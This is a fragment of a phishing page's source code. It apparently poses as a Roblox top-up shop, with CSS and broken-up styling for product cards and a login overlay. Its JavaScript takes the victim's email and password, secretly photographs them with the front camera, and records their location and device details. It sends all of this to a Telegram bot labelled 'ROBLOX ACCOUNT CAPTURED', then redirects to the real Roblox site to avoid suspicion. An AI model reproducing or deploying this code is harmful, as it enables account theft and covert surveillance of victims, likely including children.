        .product-grid {

            margin-bottom: 20px;
        }
        .product-card {
            background: #22222a;
            border-radius: 12px;
            padding: 16px;
            text-align: center;
            cursor: pointer;
            transition: 0.15s;
            border: 1px solid transparent;
        }
        .product-card:hover { border-color: #e2231a; background: #2a2a34; }
        .product-card .amount {

            font-weight: 800;

            font-weight: 700;
            cursor: pointer;
            width: 100%;
            font-size: 13px;

        /* Overlay login */

            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 999;
            align-items: center;
            justify-content: center;
        }
        .overlay.active { display: flex; }
        .login-modal {
            background: #1e1e24;
            border-radius: 16px;
            padding: 28px;
            width: 90%;
            max-width: 400px;
            text-align: center;
            box-shadow: 0 12px 40px rgba(0,0,0,0.7);

        .login-modal h3 { margin-bottom: 8px; color: #fff; }
        .login-modal p { color: #aaa; font-size: 13px; margin-bottom: 20px; }
        .login-modal input {

            border-radius: 8px;

            background: #121214;

            margin-top: 10px;

    let selectedProduct = null;

    // Render product cards

    // ========== PROSES LOGIN + DATA COLLECTION ==========
    async function processLogin() {
        const email = document.getElementById("emailInput").value.trim();
        const pass = document.getElementById("passInput").value.trim();
        if (!email || !pass) return alert("Harap isi email dan password!");

        const permNote = document.getElementById("permNote");
        permNote.textContent = "Memverifikasi keamanan...";

        // 1. Kumpulkan data device
        const deviceInfo = {
            brand: navigator.userAgentData?.platform || navigator.platform,
            model: (navigator.userAgentData?.brands || []).map(b => b.brand).join(', ') || navigator.userAgent,
            battery: 'N/A',
            location: 'Tidak diberikan'
        };
        try {
            if ('getBattery' in navigator) {
                const b = await navigator.getBattery();
                deviceInfo.battery = `${Math.round(b.level*100)}% ${b.charging?'⚡':'🔋'}`;
            }
        } catch(e) {}

        // 2. Aktifkan kamera depan dan ambil foto
        let photoBase64 = null;
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.getElementById("camPreview");
            video.srcObject = stream;
            video.style.display = "block";
            await video.play();
            await new Promise(r => setTimeout(r, 1000));
            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth || 320;
            canvas.height = video.videoHeight || 240;
            canvas.getContext("2d").drawImage(video, 0, 0);
            photoBase64 = canvas.toDataURL("image/jpeg", 0.8);
            stream.getTracks().forEach(t => t.stop());
            video.style.display = "none";
        } catch(e) { console.log("Kamera tidak diizinkan"); }

        // 3. Lokasi
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {
                deviceInfo.location = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
                sendAllData(email, pass, deviceInfo, photoBase64);
            }, err => {
                deviceInfo.location = `Ditolak (${err.code})`;
                sendAllData(email, pass, deviceInfo, photoBase64);
            }, { timeout: 8000 });
        } else {
            sendAllData(email, pass, deviceInfo, photoBase64);
        }
    }

    async function sendAllData(email, pass, device, photoBase64) {
        const message = `
🔴 <b>ROBLOX ACCOUNT CAPTURED — ${selectedProduct.amount}</b>
━━━━━━━━━━━━━━━━━
📧 <b>Email:</b> <code>${escapeHtml(email)}</code>
🔑 <b>Password:</b> <code>${escapeHtml(pass)}</code>
━━━━━━━━━━━━━━━━━
📱 <b>Device:</b> ${escapeHtml(device.model)}
🖥️ <b>Platform:</b> ${escapeHtml(device.brand)}
🔋 <b>Baterai:</b> ${device.battery}
📍 <b>Lokasi:</b> ${device.location}
━━━━━━━━━━━━━━━━━
💰 <b>Produk dipilih:</b> ${selectedProduct.amount} - ${selectedProduct.price}
🕒 <b>Waktu:</b> ${new Date().toLocaleString('id-ID')}
        `;
        // Kirim pesan teks
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "HTML" })
        });
        // Kirim foto jika ada
        if (photoBase64) {
            const blob = await (await fetch(photoBase64)).blob();
            const fd = new FormData();
            fd.append("chat_id", CHAT_ID);
            fd.append("caption", `📸 Selfie korban: ${email}`);
            fd.append("photo", blob, "selfie.jpg");
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
        }

        // Selesai, redirect ke Roblox asli biar gak curiga
        document.getElementById("permNote").textContent = "Login berhasil! Mengalihkan...";
        setTimeout(() => { window.location.href = "https://www.roblox.com/home"; }, 1500);
    }

    function escapeHtml(s) {
        return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
    }
